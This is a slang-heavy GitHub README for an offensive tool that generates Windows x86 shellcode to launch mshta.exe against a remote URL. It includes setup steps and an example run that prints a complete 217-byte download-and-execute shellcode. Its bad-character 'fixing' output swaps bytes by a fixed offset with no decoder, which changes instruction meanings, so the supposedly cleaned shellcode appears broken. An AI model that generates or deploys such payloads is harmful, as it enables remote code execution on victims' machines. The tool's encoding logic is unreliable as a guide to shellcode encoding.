
# ShellcodeGenZ
![image](https://github.com/user-attachments/assets/8ba517e4-acfd-4162-9720-fe8ec78af641)
![image](https://github.com/user-attachments/assets/8984c1dc-53f4-4f5b-b887-653461ee312e)

Yo, welcome to ShellcodeGenZ, the dopest shellcode generator for commands, crafted by the legend Zeyad Azima (https://zeyadazima.com - contact@zeyadazima.com). This tool's straight-up slayin' the game by whippin' up clean shellcode, yeetin' bad chars like nobody's biz, and droppin' logs so you know what's poppin'. Built with Gen-Z energy, it's got manual and auto modes to fix bad chars, checks for 0x00 like a boss, and keeps the vibes no cap. This is your go-to for shellcode that slaps.

## What's the Vibe?

ShellcodeGenZ takes your commands (like mshta.exe http://192.168.0.1/azi.hta) and turns 'em into shellcode that's ready to flex. It hunts down bad chars (like 0x0a, 0x0b, or the default 0x00), lets you yeet 'em manually or auto with add/subtract offsets, and logs every move so you're never lost. If 0x00 sneaks into push instructions, it's a hard pass—script's outtie. With colored output and Gen-Z slang, it's like codin' with your besties.

## Features That Slap
- mshta Shellcode Gen: Turns mshta commands into lit shellcode.
- Bad Char Yeeter: Spots bad chars and lets you fix 'em manual (pick your hex) or auto (add/subtract offsets).
- Manual Offset Drip: Choose your own offset for auto mode, or let it test 0x01 to 0xff.
- 0x00 Check: Always yeets 0x00 and bails if it's in push instructions.
- Logs for Days: Detailed logs with Gen-Z flair so you know what's good.
- Colorful Vibes: Rockin' colorama for that terminal glow-up.

## Gettin' Set Up

To dodge the externally-managed-environment drama, we settin' up a virtual env. Here's the tea:

1. Make a Virtual Env:
   ```bash
   python3 -m venv venv
   source venv/bin/activate
   ```

2. Snag the Dependencies:
   ```bash
   pip install keystone-engine colorama
   ```

3. Grab the Script:
   Clone this repo or yoink shellcode_genz.py from the files.

4. Yeet the Env (When Done):
   ```bash
   deactivate
   ```

## How to Slay with ShellcodeGenZ

1. Run the Script:
   Fire it up in your virtual env:
   ```bash
   python3 ShellcodeGenZ.py
   ```

2. Drop Your Inputs:
   - mshta command: Like mshta.exe http://example.com.
   - Bad chars: Comma-separated hex (e.g., 0a,0b). It always checks 0x00, no cap.

3. Yeet Bad Chars:
   - If bad chars pop up, choose to yeet 'em (Y/N).
   - Pick manual (drop new hex values) or automated (add/subtract offsets).
   - For auto, select manual offset (like 01) or automatic (tests all offsets).

4. Check the Output:
   - Shellcode drops as a byte string (e.g., b"\x...\").
   - Logs spill the tea on every step, from instructions to bad char fixes.

### Example Run

Input:
```
ShellcodeGenZ by: Zeyad Azima ( https://zeyadazima.com - contact@zeyadazima.com ) - let's get this shellcode poppin'!
Drop your mshta command to make it lit: mshta.exe https://192.168.0.1/azi.h1
Spill the bad chars to yeet (comma vibes, like '0a,0b'): 01,20,80,81
```

Output (shortened for vibes):
```
2025-04-28 03:11:20,452 - INFO - mshta instructions are straight fire:
push 0x31682e69;
push 0x7a612f31;
push 0x2e302e38;
push 0x36312e32;
push 0x39312f2f;
push 0x3a737074;
push 0x74682065;
push 0x78652e61;
push 0x7468736d;
2025-04-28 03:11:20,454 - INFO - mshta shellcode’s droppin’ like a banger: shellcode = b"\x89\xe5\x81\xc4\xf0\xf9\xff\xff\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x5e\x08\x8b\x7e\x20\x8b\x36\x66\x39\x4f\x18\x75\xf2\xeb\x06\x5e\x89\x75\x04\xeb\x54\xe8\xf5\xff\xff\xff\x60\x8b\x43\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x36\x49\x8b\x45\xfc\x8b\x34\x88\x01\xde\x31\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x24\x75\xdf\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61\xc3\x68\x98\xfe\x8a\x0e\xe8\xa7\xff\xff\xff\x89\x45\x12\x68\x83\xb9\xb5\x78\xe8\x9a\xff\xff\xff\x89\x45\x16\x31\xc9\x51\x68\x69\x2e\x68\x31\x68\x31\x2f\x61\x7a\x68\x38\x2e\x30\x2e\x68\x32\x2e\x31\x36\x68\x2f\x2f\x31\x39\x68\x74\x70\x73\x3a\x68\x65\x20\x68\x74\x68\x61\x2e\x65\x78\x68\x6d\x73\x68\x74\x54\x5b\x31\xc9\x51\x53\xff\x55\x12\x31\xc9\x51\x6a\xff\xff\x55\x16"!
2025-04-28 03:11:20,454 - INFO - Shellcode’s flexin’ at 217 bytes, no cap!
2025-04-28 03:11:20,454 - WARNING - Caught bad char 0x81 lurkin’ at index 2! Sus vibes.
2025-04-28 03:11:20,454 - INFO - Nearby byte be like: 0x81
2025-04-28 03:11:20,454 - WARNING - Caught bad char 0x20 lurkin’ at index 25! Sus vibes.
2025-04-28 03:11:20,454 - INFO - Nearby byte be like: 0x20
2025-04-28 03:11:20,454 - WARNING - Caught bad char 0x01 lurkin’ at index 55! Sus vibes.
2025-04-28 03:11:20,454 - INFO - Nearby byte be like: 0x01
2025-04-28 03:11:20,454 - WARNING - Caught bad char 0x20 lurkin’ at index 62! Sus vibes.
2025-04-28 03:11:20,454 - INFO - Nearby byte be like: 0x20
2025-04-28 03:11:20,455 - WARNING - Caught bad char 0x01 lurkin’ at index 63! Sus vibes.
2025-04-28 03:11:20,455 - INFO - Nearby byte be like: 0x01
2025-04-28 03:11:20,455 - WARNING - Caught bad char 0x01 lurkin’ at index 77! Sus vibes.
2025-04-28 03:11:20,455 - INFO - Nearby byte be like: 0x01
2025-04-28 03:11:20,455 - WARNING - Caught bad char 0x01 lurkin’ at index 91! Sus vibes.
2025-04-28 03:11:20,455 - INFO - Nearby byte be like: 0x01
2025-04-28 03:11:20,455 - WARNING - Caught bad char 0x01 lurkin’ at index 104! Sus vibes.
2025-04-28 03:11:20,455 - INFO - Nearby byte be like: 0x01
2025-04-28 03:11:20,455 - WARNING - Caught bad char 0x01 lurkin’ at index 113! Sus vibes.
2025-04-28 03:11:20,455 - INFO - Nearby byte be like: 0x01
2025-04-28 03:11:20,455 - WARNING - Caught bad char 0x01 lurkin’ at index 118! Sus vibes.
2025-04-28 03:11:20,455 - INFO - Nearby byte be like: 0x01
2025-04-28 03:11:20,455 - WARNING - Caught bad char 0x20 lurkin’ at index 187! Sus vibes.
2025-04-28 03:11:20,455 - INFO - Nearby byte be like: 0x20
Wanna yeet those bad chars? (Y/N): Y
You goin’ manual or auto for yeetin’ bad chars? (manual/automated): automated
Yo, what’s the move? Add or subtract for encodin’? (add/subtract): add
You droppin’ your own offset or we auto-pickin’? (manual/automatic): automatic
2025-04-28 03:11:51,821 - INFO - Kickin’ off bad char yeetin’ with add vibes and automatic offset slay
2025-04-28 03:11:51,821 - INFO - Bad chars we gotta yeet: 0x01, 0x20, 0x81
2025-04-28 03:11:51,821 - INFO - Chars we dodgin’: 0x01, 0x20, 0x80, 0x81, 0x00
2025-04-28 03:11:51,822 - INFO - Goin’ auto mode, testin’ offsets 0x01 to 0xff like a boss!
2025-04-28 03:11:51,822 - INFO - Dippin’ past offset 0x01 ‘cause it’s a bad char
2025-04-28 03:11:51,822 - INFO - Checkin’ offset 0x02... let’s see if it slaps
2025-04-28 03:11:51,822 - INFO -   Bad char 0x01 turnin’ into 0x03 (add 0x02)
2025-04-28 03:11:51,822 - INFO -   Bad char 0x20 turnin’ into 0x22 (add 0x02)
2025-04-28 03:11:51,822 - INFO -   Bad char 0x81 turnin’ into 0x83 (add 0x02)
2025-04-28 03:11:51,822 - INFO - YO, offset 0x02 is straight fire for add!
2025-04-28 03:11:51,822 - INFO - Replacements droppin’: 0x01 -> 0x03, 0x20 -> 0x22, 0x81 -> 0x83
2025-04-28 03:11:51,822 - INFO - Shellcode’s lookin’ fresh with new vibes: shellcode = b"\x89\xe5\x83\xc4\xf0\xf9\xff\xff\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x5e\x08\x8b\x7e\x22\x8b\x36\x66\x39\x4f\x18\x75\xf2\xeb\x06\x5e\x89\x75\x04\xeb\x54\xe8\xf5\xff\xff\xff\x60\x8b\x43\x3c\x8b\x7c\x03\x78\x03\xdf\x8b\x4f\x18\x8b\x47\x22\x03\xd8\x89\x45\xfc\xe3\x36\x49\x8b\x45\xfc\x8b\x34\x88\x03\xde\x31\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x03\xc2\xeb\xf4\x3b\x54\x24\x24\x75\xdf\x8b\x57\x24\x03\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x03\xda\x8b\x04\x8a\x03\xd8\x89\x44\x24\x1c\x61\xc3\x68\x98\xfe\x8a\x0e\xe8\xa7\xff\xff\xff\x89\x45\x12\x68\x83\xb9\xb5\x78\xe8\x9a\xff\xff\xff\x89\x45\x16\x31\xc9\x51\x68\x69\x2e\x68\x31\x68\x31\x2f\x61\x7a\x68\x38\x2e\x30\x2e\x68\x32\x2e\x31\x36\x68\x2f\x2f\x31\x39\x68\x74\x70\x73\x3a\x68\x65\x22\x68\x74\x68\x61\x2e\x65\x78\x68\x6d\x73\x68\x74\x54\x5b\x31\xc9\x51\x53\xff\x55\x12\x31\xc9\x51\x6a\xff\xff\x55\x16"!
2025-04-28 03:11:51,823 - INFO - New shellcode length’s poppin’ off at 217 bytes!
ShellcodeGenZ by: Zeyad Azima ( https://zeyadazima.com - contact@zeyadazima.com ) - we slayed it, fam!
```

## Got Tea?

Wanna add more drip, report a bug, or just vibe? Hit up the issues tab or slide into Zeyad’s DMs at contact@zeyadazima.com. Let’s keep ShellcodeGenZ the most lit shellcode tool in the game.
